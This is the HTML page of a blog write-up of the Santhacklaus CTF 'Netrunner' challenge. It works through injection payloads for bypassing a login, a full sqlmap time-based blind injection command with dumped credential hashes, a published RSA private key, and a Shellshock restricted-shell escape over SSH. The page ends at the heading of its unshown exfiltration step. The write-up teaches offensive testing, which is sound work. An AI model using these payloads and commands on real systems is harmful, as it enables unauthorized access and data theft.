@@ -1,0 +1,767 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en-us">
+<head>
+  <title>
+    Netrunner // Personnal security blog
+  </title>
+
+  <link href="http://gmpg.org/xfn/11" rel="profile">
+<meta http-equiv="content-type" content="text/html; charset=utf-8">
+
+
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+
+<meta name="description" content="">
+<meta name="keywords" content="">
+<meta name="author" content="">
+<meta name="generator" content="Hugo 0.53" />
+
+  <meta property="og:title" content="Netrunner" />
+<meta property="og:description" content="" />
+<meta property="og:type" content="website" />
+<meta property="og:locale" content="en_US" />
+<meta property="og:url" content="https://thibaudrobin.github.io/writeups/santhacklaus/netrunner/" />
+
+
+  
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/pure/0.5.0/base-min.css">
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/pure/0.5.0/pure-min.css">
+  
+  
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/pure/0.5.0/grids-responsive-min.css">
+  
+  
+
+  <link rel="stylesheet" href="https://thibaudrobin.github.io//css/redlounge.css">
+  <link href="//use.fontawesome.com/releases/v5.6.3/css/all.css" rel="stylesheet">
+  <link href='//fonts.googleapis.com/css?family=Raleway:400,200,100,700,300,500,600,800' rel='stylesheet' type='text/css'>
+  <link href='//fonts.googleapis.com/css?family=Libre+Baskerville:400,700,400italic' rel='stylesheet' type='text/css'>
+
+  
+  <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/touch-icon-144-precomposed.png">
+  <link rel="shortcut icon" type="image/x-icon" href="/img/favicon.png">
+
+  
+  <link href="" rel="alternate" type="application/rss+xml" title="Personnal security blog" />
+
+    
+  
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/8.7/styles/tomorrow-night-bright.min.css">
+  
+  <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/8.7/highlight.min.js"></script>
+  <script>hljs.initHighlightingOnLoad();</script>
+
+
+  <script src="//code.jquery.com/jquery-3.3.1.min.js"></script>
+  <link rel="stylesheet" type="text/css" href="https://thibaudrobin.github.io//css/lightbox.css">
+  <script src="https://thibaudrobin.github.io//js/lightbox.min.js"></script>
+  <script src="https://thibaudrobin.github.io//js/termynal.js"></script>
+  <script src="https://thibaudrobin.github.io//js/emojify.min.js"></script>
+  
+  <link rel="stylesheet" type="text/css" href="https://thibaudrobin.github.io//css/termynal.css">
+  <link rel="stylesheet" type="text/css" href="https://thibaudrobin.github.io//css/hover.css">
+  <link rel="stylesheet" type="text/css" href="https://thibaudrobin.github.io//css/emojify.min.css">
+
+  
+
+  
+
+  
+</head>
+
+<body>
+	
+
+	<div id="layout" class="pure-g">
+    <div class="sidebar pure-u-1 pure-u-md-1-4">
+  <div class="header">
+    
+
+	
+	  <img src="/img/moi.jpg" class="sidebarphoto">
+	
+
+    <h1 class="brand-title">Thibaud Robin</h1>
+    <h2 class="brand-tagline">Alias Th1b4ud</h2>
+    <h2 class="brand-tagline">PENTESTER</h2>
+    <p>Personnal blog to speak about cybersecurity, technology and much more !</p>
+
+    <nav class="nav">
+      <ul class="nav-list">
+        <li class="nav-item"><span class="nav-item-separator">//</span><a href="https://thibaudrobin.github.io/">Home</a></li>
+        
+          <li class="nav-item"><span class="nav-item-separator">//</span><a href="/whoami">WHOAMI</a></li>
+        
+          <li class="nav-item"><span class="nav-item-separator">//</span><a href="/writeups">WRITEUPS</a></li>
+        
+          <li class="nav-item"><span class="nav-item-separator">//</span><a href="/articles">ARTICLES</a></li>
+        
+      </ul>
+    </nav>
+
+    
+    <div class="social-buttons">
+      
+        
+        <a href="https://github.com/thibaudrobin" target="_blank"><i class='fab fa-github'></i></a>
+        
+      
+        
+        <a href="https://gitlab.com/thibaud.robin" target="_blank"><i class='fab fa-gitlab'></i></a>
+        
+      
+        
+        <a href="https://www.linkedin.com/in/thibaud-robin/" target="_blank"><i class='fab fa-linkedin'></i></a>
+        
+      
+        
+        <a href="https://www.root-me.org/Th1b4ud/" target="_blank"><i class='root-me'></i></a>
+        
+      
+        
+        <a href="https://twitter.com/th1b4ud" target="_blank"><i class='fab fa-twitter'></i></a>
+        
+      
+      
+    </div>
+    
+
+  </div>
+</div>
+
+	
+	
+
+    <div class="content pure-u-1 pure-u-md-3-4">
+		<a name="top"></a>
+		
+
+		
+			
+		    <div id="toc" class="pure-u-1 pure-u-md-1-4">
+				<small class="toc-label">Contents</small>
+		   	 	<nav id="TableOfContents">
+<ul>
+<li>
+<ul>
+<li><a href="#1st-step-you-have-a-mission">1st step - You have a mission !</a>
+<ul>
+<li><a href="#test-for-ldap-injection">Test for LDAP Injection</a></li>
+<li><a href="#test-for-nosql-injection">Test for NoSQL Injection</a></li>
+<li><a href="#test-for-xpath">Test for XPath</a></li>
+<li><a href="#test-for-sql-injection">Test for SQL Injection</a></li>
+</ul></li>
+<li><a href="#2nd-step-bypass-protection">2nd step - Bypass protection</a></li>
+<li><a href="#3rd-step-nice-exfiltration">3rd step - Nice exfiltration !</a></li>
+<li><a href="#conclusion">Conclusion</a></li>
+</ul></li>
+</ul>
+</nav>
+		    </div>
+		    
+	    
+  		<section class="post">
+            <h1 class="post-title">
+              <a href="/writeups/santhacklaus/netrunner/">Netrunner</a>
+						</h1>
+						
+            <h3 class="post-subtitle">
+							<sup class="quote"><i class="fas fa-quote-left"></i></sup>
+							V, I got a mission for you !
+						</h3>
+						
+            
+            	<span class="post-date">
+                	<span class="post-date-day"><sup>30</sup></span><span class="post-date-separator">/</span><span class="post-date-month">Dec</span> <span class="post-date-year">2018</span>
+            	</span>
+            	
+            
+            	
+            
+
+			
+			
+				<div class="post-categories">
+				
+					<a class="post-category post-category-writeups" href="https://thibaudrobin.github.io//categories/writeups">Writeups</a>
+				
+					<a class="post-category post-category-ctf" href="https://thibaudrobin.github.io//categories/ctf">CTF</a>
+				
+					<a class="post-category post-category-santhacklaus" href="https://thibaudrobin.github.io//categories/santhacklaus">Santhacklaus</a>
+				
+					<a class="post-category post-category-web" href="https://thibaudrobin.github.io//categories/web">Web</a>
+				
+					<a class="post-category post-category-system" href="https://thibaudrobin.github.io//categories/system">System</a>
+				
+				</div>
+			
+
+			
+
+			
+
+            
+
+<p>Netrunner is the second biggest challenge of the Santhacklaus CTF. The challenge is not really hard, but could be particulary annoying if you don&rsquo;t know what to do. You need to have some skills in pentest web and medium skills in Linux system.</p>
+
+<p>The challenge is divided in 3 steps. Each step has its own validation password (flag). So let&rsquo;s begin with the first step !</p>
+
+<p><img src="/img/santhacklaus/netrunner1.png" alt="" /></p>
+
+<h2 id="1st-step-you-have-a-mission">1st step - You have a mission !</h2>
+
+<p><img src="/img/santhacklaus/netrunner2.png" alt="" /></p>
+
+<p>Well received ! Mission accepted, let&rsquo;s save the world !
+Fire your favorite web browser and navigate to <a href="http://santhacklaus.xyz:2077/">http://santhacklaus.xyz:2077/</a></p>
+
+<p><img src="/img/santhacklaus/netrunner3.png" alt="" /></p>
+
+<p>Humm authentication page. Let&rsquo;s inspect that.</p>
+
+<div class="alert protips">
+    <i class="logo fas fa-hand-holding-heart"></i>
+    <p class="text"><strong>ProTips</strong> : When you do web pentesting, you must have a proxy who intercept request to inspect and replay it. I recommend you to use Burp with the browser extension FoxyProxy to switch rapidly between all yours proxys. 
+    
+    </p>
+</div>
+
+<p>So open Burp to do traffic interception. Submit something in the form and send the request to repeater section in Burp.</p>
+
+<p><img src="/img/santhacklaus/netrunner4.png" alt="" /></p>
+
+<p>Ok that&rsquo;s better ! So what can we see ?</p>
+
+<ul>
+<li>The form send credentials to <code>/zetatech-admin.php</code> for checking.</li>
+<li>Server is running Nginx web server</li>
+<li>Http bruteforce is forbidden. Then, there is probably no others pages. You have to find a vulnerability on this page.</li>
+</ul>
+
+<p>Ok but what am I supposed to do now ? Take a breath and read the OWASP Testing Guide : <a href="https://www.owasp.org/index.php/Web_Application_Security_Testing_Cheat_Sheet">https://www.owasp.org/index.php/Web_Application_Security_Testing_Cheat_Sheet</a></p>
+
+<p>Here some work with most famous injection :</p>
+
+<ul>
+<li>Test for LDAP Injection : <a href="https://www.owasp.org/index.php/Testing_for_LDAP_Injection_(OTG-INPVAL-006">https://www.owasp.org/index.php/Testing_for_LDAP_Injection_(OTG-INPVAL-006</a>)</li>
+<li>Test for NoSQL injection : <a href="https://www.owasp.org/index.php/Testing_for_NoSQL_injection">https://www.owasp.org/index.php/Testing_for_NoSQL_injection</a></li>
+<li>Test for XPath Injection : <a href="https://www.owasp.org/index.php/Testing_for_XPath_Injection_(OTG-INPVAL-010">https://www.owasp.org/index.php/Testing_for_XPath_Injection_(OTG-INPVAL-010</a>)</li>
+<li>Test for SQL Injection : <a href="https://www.owasp.org/index.php/Testing_for_SQL_Injection_(OTG-INPVAL-005">https://www.owasp.org/index.php/Testing_for_SQL_Injection_(OTG-INPVAL-005</a>)</li>
+</ul>
+
+<h3 id="test-for-ldap-injection">Test for LDAP Injection</h3>
+
+<p>First, try if the application is vulerable to LDAP injection with the help of owasp guide
+If an application uses LDAP in its user authentication process, and is vulnerable to LDAP injection, it can be bypassed by injecting an LDAP query that will always be true (similar to SQL and XPATH injections).</p>
+
+<p>Let&rsquo;s assume that a web application uses a filter to do the LDAP user / password mapping.</p>
+
+<p><code>searchlogin = &quot;(&amp;(USER = &quot; + user_name + &quot;) (PASSWORD = &quot; + user_password + &quot;))&quot;;</code></p>
+
+<p>Using the following values:</p>
+
+<pre><code>user = johnDoe)(&amp;)
+pass = password
+</code></pre>
+
+<p>The search filter becomes:</p>
+
+<p><code>searchlogin = &quot;(&amp;(USER = johnDoe)(&amp;))(PASSWORD = pass))&quot;</code></p>
+
+<p>Only the first portion of this query is processed by the LDAP server <code>(&amp;(USER = johnDoe)(&amp;)</code> which always evaluates to true allowing the attacker to gain access to the system without needing to provide valid user credentials.</p>
+
+<p>Thanks wikipédia ! Let&rsquo;s try this. Here is an example of what you can try.</p>
+
+<p><img src="/img/santhacklaus/netrunner5.png" alt="" /></p>
+
+<p>Humm not seem effective. Let&rsquo;s try an other injection.</p>
+
+<h3 id="test-for-nosql-injection">Test for NoSQL Injection</h3>
+
+<p>NoSQL databases provide looser consistency restrictions than traditional SQL databases. By requiring fewer relational constraints and consistency checks, NoSQL databases often offer performance and scaling benefits.</p>
+
+<p>It&rsquo;s really easy to detect. Look at the query below. The <code>[$ne]</code> string mean not equal. So the query mean : <strong><em>username not equal to th1b4ud and password not equal to p4sSw0rD</em></strong>. So the query will return true.</p>
+
+<p><code>username[$ne]=th1b4ud&amp;password[$ne]=p4sSw0rD</code></p>
+
+<p>Test this !</p>
+
+<p><img src="/img/santhacklaus/netrunner7.png" alt="" /></p>
+
+<p>Sad :(</p>
+
+<h3 id="test-for-xpath">Test for XPath</h3>
+
+<p>XPath Injection is an attack technique used to exploit applications that construct XPath (XML Path Language) queries from user-supplied input to query or navigate XML documents. The exploitation is Similar to SQL.</p>
+
+<p>An XPath query that returns the account whose username is <code>th1b4ud</code> and the password is <code>p4sSw0rD</code> would be the following:</p>
+
+<p><code>string(//user[username/text()='th1b4ud' and password/text()='p4sSw0rD']/account/text())</code></p>
+
+<p>If the application does not properly filter user input, the tester will be able to inject XPath code and interfere with the query result. For instance, the tester could input the following values:</p>
+
+<pre><code>Username: ' or '1' = '1 
+Password: ' or '1' = '1 
+</code></pre>
+
+<p>Looks quite familiar, doesn&rsquo;t it? Using these parameters, the query becomes:</p>
+
+<p><code>string(//user[username/text()='' or '1' = '1' and password/text()='' or '1' = '1']/account/text())</code></p>
+
+<p>As in a common SQL Injection attack, we have created a query that always evaluates to true, which means that the application will authenticate the user even if a username or a password have not been provided.</p>
+
+<p>So let&rsquo;s try this !</p>
+
+<p><img src="/img/santhacklaus/netrunner6.png" alt="" /></p>
+
+<p>Humm, maybe it&rsquo;s not XPath behind.</p>
+
+<h3 id="test-for-sql-injection">Test for SQL Injection</h3>
+
+<p>An SQL injection attack consists of insertion or &ldquo;injection&rdquo; of either a partial or complete SQL query via the data input or transmitted from the client (browser) to the web application. Maybe it will work (I hope !!!)</p>
+
+<p>Consider the following SQL query:</p>
+
+<p><code>SELECT * FROM Users WHERE Username='$username' AND Password='$password'</code></p>
+
+<p>A similar query is generally used from the web application in order to authenticate a user. If the query returns a value it means that inside the database a user with that set of credentials exists, then the user is allowed to login to the system, otherwise access is denied.</p>
+
+<pre><code>$username = 1' or '1' = '1
+$password = 1' or '1' = '1
+</code></pre>
+
+<p>The query will be:</p>
+
+<p><code>SELECT * FROM Users WHERE Username='1' OR '1' = '1' AND Password='1' OR '1' = '1'</code></p>
+
+<p>But remember ! We already test this payload with XPath injection. We need to go deeper !</p>
+
+<div class="alert protips">
+    <i class="logo fas fa-hand-holding-heart"></i>
+    <p class="text"><strong>ProTips</strong> : When you are searching sql injection entry point always use sleep functionnality 
+    
+    </p>
+</div>
+
+<p>Look at my last protips. I speak about <code>SLEEP()</code> function to detect entry point. The function <code>SLEEP()</code> (in mysql and in others database engine) permit to stop the server for a while. We will exploit this functionnality to detect if an entry is vulnerable. The application run with php. I hope the database engine is MySql or an other engine who support <code>SLEEP()</code> function. We shall see !</p>
+
+<p>These query should do the trick :</p>
+
+<pre><code class="language-md">username=th1b4ud&amp;password=password' OR SLEEP(3)#&amp;login=Login
+username=th1b4ud' OR SLEEP(3)#&amp;password=password&amp;login=Login
+</code></pre>
+
+<p><img src="/img/santhacklaus/netrunner1.gif" alt="" /></p>
+
+<p><img src="https://media.giphy.com/media/WuGSL4LFUMQU/giphy.gif" alt="" /></p>
+
+<p>HOHO ! We found something ! We&rsquo;ve got a sql injection vulnerability in the username ! Nice ! It&rsquo;s time to confirm that there is a mysql database behind the application.</p>
+
+<div class="alert protips">
+    <i class="logo fas fa-hand-holding-heart"></i>
+    <p class="text"><strong>ProTips</strong> : You start to know me, I love to use cheatsheet. This on is nice to explore sql injection : https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20injection 
+    
+    </p>
+</div>
+
+<p><img src="/img/santhacklaus/netrunner2.gif" alt="" /></p>
+
+<p>Nice this is MySql. So I imagine the php code behind will do advanced check to avoid to pass throught with <code>' OR 1=1#</code> injection. But I think it&rsquo;s the good moment to show you how to use Sqlmap with time based sql injection.</p>
+
+<p>This article speak well about time based injection : <a href="http://www.sqlinjection.net/time-based/">http://www.sqlinjection.net/time-based/</a></p>
+
+<div class="alert danger">
+    <i class="logo fas fa-skull-crossbones"></i>
+    <p class="text"><strong>Danger</strong> : Sqlmap is a real dangerous tool for weak application. You can easily DOS it with a --risk and --level too high. Set a delay in your command argument (ex : --delay 5 -&gt; 5s of delay between each request) when you are not sure. 
+    
+    </p>
+</div>
+
+<p>So what do we have to set to Sqlmap :</p>
+
+<ul>
+<li><strong>Url (<code>-u</code>)</strong> : <code>&quot;http://51.75.202.113:2077/zetatech-admin.php&quot;</code></li>
+<li><strong>Http query (<code>--data</code>)</strong> : <code>&quot;username=test&amp;password=test&amp;login=Login&quot;</code></li>
+<li><strong>Vulnerable field (<code>-p</code>)</strong> : <code>&quot;username&quot;</code></li>
+<li><strong>HTTP method (<code>--method</code>)</strong> : <code>POST</code></li>
+<li><strong>SQL Injection technique (<code>--technique</code>)</strong> : <code>T</code> for Time-Based</li>
+<li><strong>Level agressivity (<code>--level</code>)</strong> : <code>5</code> maximum (sorry for the DOS :$)</li>
+<li><strong>Dangerousness for database integrity (<code>--risk</code>)</strong> : <code>2</code> (3 is the maximum and can lead to an update of all the entries of the table)</li>
+<li><strong>Database engine (<code>--dbms</code>)</strong> : <code>mysql</code></li>
+<li><strong>Action to perform</strong> : dump the database with <code>--dump</code></li>
+</ul>
+
+<pre><code>th1b4ud@th1b4ud-pc $ sqlmap -u &quot;http://51.75.202.113:2077/zetatech-admin.php&quot; --data &quot;username=test&amp;password=test&amp;login=Login&quot; -p &quot;username&quot; --method POST --random-agent --technique=T --level=5 --risk=2 --dbms=mysql --dump
+        ___
+       __H__
+ ___ ___[.]_____ ___ ___  {1.2.11#stable}
+|_ -| . [.]     | .'| . |
+|___|_  [']_|_|_|__,|  _|
+      |_|V          |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting at 13:35:34
+
+---
+Parameter: username (POST)
+    Type: AND/OR time-based blind
+    Title: MySQL &gt;= 5.0.12 AND time-based blind
+    Payload: username=test'||(SELECT 0x74657745 FROM DUAL WHERE 4732=4732 AND SLEEP(5))||'&amp;password=test&amp;login=Login
+---
+
+[...]
+
+Database: ctf-zetatech-inc
+Table: access
+[2 entries]
++----+---------------+------------------------------------------------------------------+
+| id | user          | password                                                         |
++----+---------------+------------------------------------------------------------------+
+| 1  | admin         | e6c2d84527c9f0af9b6d6fe33fd987b6ef47360e335e71220201e72c4ac5ccf9 |
+| 2  | puppet-master | 31e2d9e7ee8279341dee46986670996145a699937616fd03fe362426b5b47c25 |
++----+---------------+------------------------------------------------------------------+
+
+[15:15:35] [INFO] table '`ctf-zetatech-inc`.access' dumped to CSV file '/home/th1b4ud/.sqlmap/output/51.75.202.113/dump/ctf-zetatech-inc/access.csv'
+[15:15:35] [INFO] fetched data logged to text files under '/home/th1b4ud/.sqlmap/output/51.75.202.113'
+
+[*] shutting down at 15:15:35
+</code></pre>
+
+<p>Ho finally ! We dump the database ! We&rsquo;ve got two users : <code>admin</code> and <code>puppet-master</code>. Let&rsquo;s try a very simple injection with these informations.</p>
+
+<pre><code>admin'#
+puppet-master'#
+</code></pre>
+
+<p>With admin</p>
+
+<p><img src="/img/santhacklaus/netrunner8.png" alt="" /></p>
+
+<p>Sad :(</p>
+
+<p><img src="/img/santhacklaus/netrunner9.png" alt="" /></p>
+
+<p><img src="https://media.giphy.com/media/3o6UB3VhArvomJHtdK/giphy.gif" alt="" /></p>
+
+<p>OMG IT WORKS !</p>
+
+<h2 id="2nd-step-bypass-protection">2nd step - Bypass protection</h2>
+
+<p><img src="/img/santhacklaus/netrunner10.png" alt="" /></p>
+
+<p>We&rsquo;ve got an access to the application. We now have an access to this page : <a href="http://santhacklaus.xyz:2077/e91ac60004c77904ad889a5762a68b06e53b7c21.html">http://santhacklaus.xyz:2077/e91ac60004c77904ad889a5762a68b06e53b7c21.html</a></p>
+
+<p>There is a private key.</p>
+
+<pre><code>-----BEGIN RSA PRIVATE KEY-----
+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
+-----END RSA PRIVATE KEY-----
+</code></pre>
+
+<p>Why not try a ssh connexion with the username <code>puppet-master</code> on the port <code>2021</code> (see description)</p>
+
+<pre><code>th1b4ud@th1b4ud-pc $ ssh puppet-master@51.75.202.113 -p 2021 -i key
+
+.___..___.___..__..___..___ __ .  .
+  _/ [__   |  [__]  |  [__ /  `|__|
+./__.[___  |  |  |  |  [___\__.|  |
+
+
+Do not use Zetatech maintenance interface if you are not authorized by Zetatech Corporation.
+
+
+████████████████████████████ CONNECTION ESTABLISHED ████████████████████████████
+
+
+----------------------------- General Informations -----------------------------
+
+Software Version     ::: 10.5.2546_b1 [OBSOLETE]
+Client ID            ::: 1534D 4245 97554 P
+
+General health       ::: [ALIVE]
+
+Management interface ::: [ONLINE]
+Maintenance link     ::: [ONLINE]
+
+
+
+----------------------- Installed Cybernetic Prosthetics -----------------------
+
+Zetatech Neural Processor MK.II   ::: [CONNECTION ERROR]
+Zetatech Enforcement 10.A Sidearm ::: [NOT CONNECTED]
+Zetatech Binoculars BT.4          ::: [NOT CONNECTED]
+
+
+Connection to 51.75.202.113 closed.
+</code></pre>
+
+<p>Ho ! Connection closed ! Maybe we have to bypass a restricted shell or a similar protection.
+Lets type the question to Google : <code>escape restricted shell</code> and click on the first link : <a href="https://speakerdeck.com/knaps/escape-from-shellcatraz-breaking-out-of-restricted-unix-shells">https://speakerdeck.com/knaps/escape-from-shellcatraz-breaking-out-of-restricted-unix-shells</a></p>
+
+<p>Look at the ninth slide :</p>
+
+<pre><code class="language-bash"># Use SSH on your machine to execute commands before the remote shell is loaded
+ssh restricted@10.20.30.40 -t &quot;/bin/sh&quot;
+
+# Or start the remote shell without loading &quot;rc&quot; profile (where most of the limitations are often configured)
+ssh restricted@10.20.30.40 -t &quot;bash --noprofile&quot;
+
+# Try ShellShock on vulnerable shell implementations
+ssh restricted@10.20.30.40 -t &quot;() { :; }; /bin/bash&quot;
+</code></pre>
+
+<p>Let&rsquo;s try this 3 commands</p>
+
+<pre><code>th1b4ud@th1b4ud-pc $ ssh puppet-master@51.75.202.113 -p 2021 -i key -t &quot;/bin/sh&quot;
+
+[...]
+
+Connection to 51.75.202.113 closed.
+</code></pre>
+
+<p>No</p>
+
+<pre><code>th1b4ud@th1b4ud-pc $ ssh puppet-master@51.75.202.113 -p 2021 -i key -t &quot;bash --noprofile&quot;
+
+[...]
+
+Connection to 51.75.202.113 closed.
+</code></pre>
+
+<p>No</p>
+
+<pre><code>th1b4ud@th1b4ud-pc $ ssh puppet-master@51.75.202.113 -p 2021 -i key -t &quot;() { :; }; /bin/bash&quot;
+.___..___.___..__..___..___ __ .  .
+  _/ [__   |  [__]  |  [__ /  `|__|
+./__.[___  |  |  |  |  [___\__.|  |
+
+
+Do not use Zetatech maintenance interface if you are not authorized by Zetatech Corporation.
+puppet-master@2a87f3ade358:~$ 
+</code></pre>
+
+<p>WUT ? O.O</p>
+
+<p><img src="https://media.giphy.com/media/aWPGuTlDqq2yc/giphy.gif" alt="" /></p>
+
+<p>Stop, stop, stop ! Shellshock ?!? Really ?!?</p>
+
+<pre><code class="language-bash">puppet-master@2a87f3ade358:~$ env x='() { :;}; echo vulnerable' bash -c &quot;echo this is a test&quot;
+vulnerable
+this is a test
+</code></pre>
+
+<p>Ok&hellip; Shellshock \o/</p>
+
+<p>What is Shellshock ?</p>
+
+<p><code>Shellshock, also known as Bashdoor, is a family of security bugs in the widely used Unix Bash shell, the first of which was disclosed on 24 September 2014. Many Internet-facing services, such as some web server deployments, use Bash to process certain requests, allowing an attacker to cause vulnerable versions of Bash to execute arbitrary commands. This can allow an attacker to gain unauthorized access to a computer system.</code></p>
+
+<p>Thank you Wikipedia. There is many articles on Internet who will do a better explanation than me, in particular this one : <a href="https://fedoramagazine.org/shellshock-how-does-it-actually-work/">https://fedoramagazine.org/shellshock-how-does-it-actually-work/</a></p>
+
+<p>And what is <code>-t</code> argument in ssh ?</p>
+
+<pre><code>-t      Force pseudo-terminal allocation.  This can be used to execute arbitrary screen-based programs on a remote
+        machine, which can be very useful, e.g. when implementing menu services.  Multiple -t options force tty
+        allocation, even if ssh has no local tty.
+</code></pre>
+
+<p>With <code>-t</code> argument you can execute arbitrary programs on the server. Perfect for us ! The host is vulnerable to shellshock, so we can abuse this ssh feature to exploit the Shellshock vulnerability to obtain a shell \o/</p>
+
+<pre><code>puppet-master@2a87f3ade358:~$ cat client.note 
+
+.___..___.___..__..___..___ __ .  .
+  _/ [__   |  [__]  |  [__ /  `|__|
+./__.[___  |  |  |  |  [___\__.|  |
+
+
+:::: Client Note ::::
+
+You can access to your web interface to have more informations.
+You can use this maintenance interface anytime to check your Cybernetics Prosthetics status.
+If you have any issues with Zetatech products, please contact us.
+
+Note: the password is the same than your username.
+
+:: IMTLD{Pr0t3ct_Y0uR_Gh0sT}
+</code></pre>
+
+<p>Go to the next and last step !</p>
+
+<h2 id="3rd-step-nice-exfiltration">3rd step - Nice exfiltration !</h2>
+
